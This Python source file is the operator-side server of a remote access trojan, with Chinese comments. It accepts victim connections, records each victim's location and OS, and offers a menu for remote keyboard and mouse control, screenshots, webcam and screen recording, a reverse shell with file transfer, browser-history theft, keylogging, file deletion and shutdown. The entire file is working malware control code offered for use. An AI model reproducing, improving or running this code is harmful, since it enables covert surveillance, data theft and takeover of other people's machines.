import socket
import struct
import os
import time
import threading
import pynput
from concurrent.futures import ThreadPoolExecutor, as_completed
from tabulate import tabulate
from time import sleep

clients = {}
client_identifiers = {}
selected_client = None
clients_lock = threading.Lock()
shutdown_flag = threading.Event()
first_connection_message_displayed = False  # 标志用于检测是否已显示过消息

def display_first_connection_message(address):
    """显示首次连接消息"""
    global first_connection_message_displayed
    if not first_connection_message_displayed:
        #print(f"*** SOMETHING IS IN ***")
        first_connection_message_displayed = True

def send_key_to_client(conn, event_type, key):
    try:
        data = f"{event_type}:{key}"
        conn.send(data.encode())
    except Exception as e:
        print(f"Error sending key to client: {e}")

def on_press(key, conn):
    try:
        send_key_to_client(conn, "press", key.char)
    except AttributeError:
        send_key_to_client(conn, "press", str(key))

def on_release(key, conn):
    send_key_to_client(conn, "release", str(key))

def keyboard_listener(conn, stop_event):
    with pynput.keyboard.Listener(
        on_press=lambda key: on_press(key, conn),
        on_release=lambda key: on_release(key, conn)
    ) as listener:
        while not stop_event.is_set():
            listener.join(0.1)

def receive_file(conn):
    fileinfo_size = struct.calcsize('128sl')

    # 確保接收到足夠的數據
    buf = b''
    while len(buf) < fileinfo_size:
        packet = conn.recv(fileinfo_size - len(buf))
        if not packet:
            raise ConnectionError("Connection lost while receiving file info")
        buf += packet

    if len(buf) == fileinfo_size:
        filename, filesize = struct.unpack('128sl', buf)
        filename = filename.strip(b'\x00').decode()

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        directory = os.path.join('./received_files', time.strftime("%Y/%m%d"))
        os.makedirs(directory, exist_ok=True)

        base, ext = os.path.splitext(filename)
        new_filename = os.path.join(directory, f"{timestamp}_{base}{ext}")

        recvd_size = 0
        with open(new_filename, 'wb') as file:
            while recvd_size < filesize:
                chunk_size = min(filesize - recvd_size, 1024)
                data = conn.recv(chunk_size)
                if not data:
                    print("Connection lost during file transfer")
                    break
                recvd_size += len(data)
                file.write(data)

        # 確認結束標誌
        end_marker = conn.recv(1024)
        if end_marker != b"END":
            print(f"Unexpected end marker: {end_marker}")

        print(f"{new_filename} 接收完")
    else:
        print(f"Received data of incorrect size: expected {fileinfo_size}, got {len(buf)}")

def handle_reverse_shell(conn):
    try:    
        while True:
            cmd = input("Enter your command : ")
            if cmd == "exit":
                conn.send(cmd.encode())
                break
            elif cmd[:4] == "down":
                conn.send(cmd.encode())
                data = b""
                while True:
                    end_data = conn.recv(1024)

                    # 如果收到 'Ended'，則停止接收
                    if end_data == b"Ended":
                        print("File transfer ended :)")
                        break

                    data += end_data

                # 將收到的數據寫入文件
                f_name = input("Enter output file name: ")
                with open(f_name, "wb") as new_f:
                    new_f.write(data)
            elif cmd[:2] == "up":
                cmd_list = cmd.split(" ")

                file = cmd_list[1]
                file = open(file,"rb")
                data = file.read()
                file.close()

                conn.send(cmd.encode())
                while True:
                    if len(data)>0:
                        temp_data = data[:1024]
                        if len(temp_data) < 1024:
                            temp_data += chr(0).encode() * (1024 - len(temp_data))

                        data = data[1024:]

                        conn.send(temp_data)
                        print("*",end="")
                    else:
                        conn.send(b"Ended")
                        e = conn.recv(1024).decode()
                        print(e)
                        #sleep(5)
                        break
            elif cmd:
                conn.send(cmd.encode())
                response = conn.recv(4096).decode()  # Adjust buffer size as needed
                print(response)
            else:
                print("Command cannot be empty")
    except (BrokenPipeError, ConnectionResetError, socket.error) as e:
        print(f"Client disconnected during reverse shell: {e}")
    finally:
        print("Exiting reverse shell and returning to client selection.")


def mouse_control_loop(conn):
    while True:
        mouse_command = input("Enter command (e.g., move 100 200, press right, press left, roller up, roller down, exit to stop): ")
        conn.send(mouse_command.encode())
        if mouse_command.lower() == 'exit':
            print("Exiting mouse control")
            break

def list_clients():
    with clients_lock:
        if not clients:
            print("No clients connected.")
            return
        # print("----------------------------------------------------------------------------------")
        # print("Connected clients:")
        headers = ["Identifier", "Address", "Name", "OS", "Public IP Address", "Country", "City"]
        table_data = []

        for identifier, info in client_identifiers.items():
            if identifier in clients:
                address = info["address"]
                name = info["name"]
                os = info["os"]
                ip_address = info["ip_address"]
                country = info["country"]
                city = info["city"]
                # isp = ip_info.get("isp", "Unknown")

                table_data.append([
                    identifier, address, name, os, ip_address, country, city
                ])

        # print("----------------------------------------------------------------------------------")
        print("Connected clients:")
        # for row in table_data:
        #     print(
        #         f"{row[0]}: Address: {row[1]}, Name: {row[2]}, OS: {row[3]}, IP Address: {row[4]}, Country: {row[5]}, City: {row[6]}")
        print(tabulate(table_data, headers=headers, tablefmt="grid"))

def select_client():
    try:
        global selected_client
        if not clients:
            print("No clients to select from.")
            return

        client_id = input("Enter client identifier: ")
        if client_id in clients:
            if is_client_alive(clients[client_id]):
                selected_client = client_id
                print(f"Selected client: {selected_client}")
            else:
                print(f"Client {client_id} is disconnected.")
        else:
            print("Invalid identifier. No client selected.")
    except Exception as e:
        print(f"Error selecting client: {e}")

keyboard_control_enabled = False
keyboard_listener_thread = None

def handle_client(conn, address):
    global keyboard_control_enabled
    global keyboard_listener_thread

    try:
        client_id = f"client_{len(clients) + 1}"
        with clients_lock:
            clients[client_id] = conn
            client_identifiers[client_id] = {
                "address": address,
                "name": "Unknown",
                "os": "Unknown",
                "ip_address": "Unknown",
                "country": "Unknown",
                "city": "Unknown",
            }

        global selected_client
        display_first_connection_message(address)

        client_info = conn.recv(1024).decode()
        info_parts = client_info.split(' <-> ')
        if len(info_parts) == 5:
            name, os, ip_address, country, city = info_parts
            with clients_lock:
                client_identifiers[client_id]["name"] = name
                client_identifiers[client_id]["os"] = os
                client_identifiers[client_id]["ip_address"] = ip_address
                client_identifiers[client_id]["country"] = country
                client_identifiers[client_id]["city"] = city

        while not shutdown_flag.is_set():
            if selected_client == client_id:
                if not is_client_alive(conn):
                    print(f"Client {client_id} is disconnected.")
                    break
                command = input(f"< {client_id} > Enter command: \n"
                                "     M  : start remote control keyboard\n"
                                "     S  : stop remote control keyboard\n"
                                "     1  : screenshots\n"
                                "     2  : screen recording\n"
                                "     3  : camera recording\n"
                                "     4  : reverse shell\n"
                                "     5  : web history\n"
                                "     6  : start keylogger\n"
                                "     7  : stop keylogger\n"
                                "     8  : file delete\n"
                                "     9  : close & file delete\n"
                                "     10 :  mouse control\n"
                                "     0 to Reset selected client\n=> ")

                if command == '0':
                    selected_client = None
                    print("Client selection reset. You can select a different client.")
                elif command == 'M':
                    if not keyboard_control_enabled:
                        keyboard_control_enabled = True
                        stop_event = threading.Event()
                        keyboard_listener_thread = threading.Thread(target=keyboard_listener, args=(conn, stop_event))
                        keyboard_listener_thread.start()
                        print("Remote keyboard control started.")
                    else:
                        print("Remote keyboard control is already running.")
                elif command == 'S':
                    if keyboard_control_enabled:
                        keyboard_control_enabled = False
                        stop_event.set()
                        keyboard_listener_thread.join()
                        print("Remote keyboard control stopped.")
                    else:
                        print("Remote keyboard control is not running.")
                else:
                    try:
                        conn.send(command.encode())
                        if command == '1':
                            num_screenshots = input("Enter number of screenshots: ")
                            if num_screenshots.isdigit():
                                num_screenshots = int(num_screenshots)
                                conn.send(str(num_screenshots).encode())
                                for _ in range(num_screenshots):
                                    receive_file(conn)
                            else:
                                print("Invalid number of screenshots")
                        elif command == '2':
                            s_duration = input("Enter the duration for recording: ")
                            conn.send(str(s_duration).encode())
                            receive_file(conn)
                        elif command == '3':
                            c_duration = input("Enter the duration for recording: ")
                            conn.send(str(c_duration).encode())
                            receive_file(conn)
                        elif command == '4':
                            handle_reverse_shell(conn)
                        elif command == '5':
                            receive_file(conn)
                        elif command == '6':
                            print('開始鍵盤記錄')
                        elif command == '7':
                            print('停止鍵盤記錄')
                            with ThreadPoolExecutor() as executor:
                                future = executor.submit(receive_file, conn)
                                future.result()  # Wait for the result
                        elif command == '8':
                            print('刪除檔案')
                        elif command == '9':
                            print('電腦關機')
                        elif command == '10':
                            mouse_control_loop(conn)
                        else:
                            print("Invalid command.")
                    except (ConnectionResetError, BrokenPipeError, OSError) as e:
                        print(f"Error sending command to client {client_id}: {e}")
                        break  # 跳出循環，結束該 client 的處理
            else:
                time.sleep(1)
    except (ConnectionResetError, BrokenPipeError) as e:
        print(f"Client {address} disconnected unexpectedly: {e}")
    except socket.error as e:
        print(f"Socket error with client {address}: {e}")
    finally:
        with clients_lock:
            if client_id in clients:
                conn.close()
                del clients[client_id]
                del client_identifiers[client_id]
                print(f"Client {client_id} disconnected.")


def close_all_clients():
    with clients_lock:
        for client_id, conn in clients.items():
            try:
                conn.close()
            except Exception as e:
                print(f"Error closing client {client_id} connection: {e}")
        clients.clear()
        client_identifiers.clear()

def client_selection_loop():
    global selected_client
    new_client_connected = False  # 标志用于检测是否有新客户端连接

    try:
        while not shutdown_flag.is_set():
            with clients_lock:
                disconnected_clients = [client_id for client_id, conn in clients.items() if not is_client_alive(conn)]
                for client_id in disconnected_clients:
                    conn = clients.pop(client_id, None)
                    if conn:
                        conn.close()
                    client_identifiers.pop(client_id, None)
                    print(f"Client {client_id} connection is not alive. (Press '0' to continue)")
                    new_client_connected = True  

                # 检测是否有新客户端连接
                if len(clients) > 0:
                    new_client_connected = True

            if new_client_connected:
                # 有新客户端连接，显示菜单
                if selected_client is None:
                    choice_client = input("Press 'cid' for list clients, 'B' for shutting down server: ")
                    if choice_client == 'cid':
                        list_clients()
                        select_client()  # 允许用户选择有效的客户端
                    elif choice_client == 'B':
                        print("Exiting client selection loop.")
                        close_all_clients()  # 关闭所有客户端连接
                        shutdown_flag.set()
                        break
                    else:
                        print("Invalid choice. Please choose again.")
                else:
                    time.sleep(1)  # 如果已经选择了客户端，等待一段时间
            else:
                # 没有客户端连接，继续循环
                time.sleep(1)
    except KeyboardInterrupt:
        print("Interrupted by user")
        shutdown_flag.set()

def is_client_alive(conn):
    try:
        conn.send(b'')
        return True
    except (socket.error, BrokenPipeError):
        return False

def server_program():
    host = '0.0.0.0'
    port = 50001

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print("Listening...")


    # 使用 ThreadPoolExecutor 管理線程
    with ThreadPoolExecutor(max_workers=10) as executor:
        selection_thread = threading.Thread(target=client_selection_loop)
        selection_thread.daemon = True
        selection_thread.start()

        try:
            while not shutdown_flag.is_set():
                try:
                    # 设置一个短的超时时间以便能够定期检查 `shutdown_flag`
                    server_socket.settimeout(1)
                    try:
                        conn, address = server_socket.accept()
                        # 启动线程来处理客户端连接
                        executor.submit(handle_client, conn, address)
                    except socket.timeout:
                        # 每次超时都检查 `shutdown_flag`，以确保及时响应关闭请求
                        continue
                    except (socket.error, ConnectionResetError) as e:
                        print(f"Error accepting connection: {e}")
                        continue  # 保持服務器運行
                    except Exception as e:
                        print(f"Error accepting connection: {e}")
                        break
                except Exception as e:
                    print(f"Unexpected error: {e}")
                    break
        except KeyboardInterrupt:
            print("Server interrupted by user")
        finally:
            print("Shutting down server...")
            shutdown_flag.set()
            close_all_clients()
            server_socket.close()

if __name__ == '__main__':
    server_program()
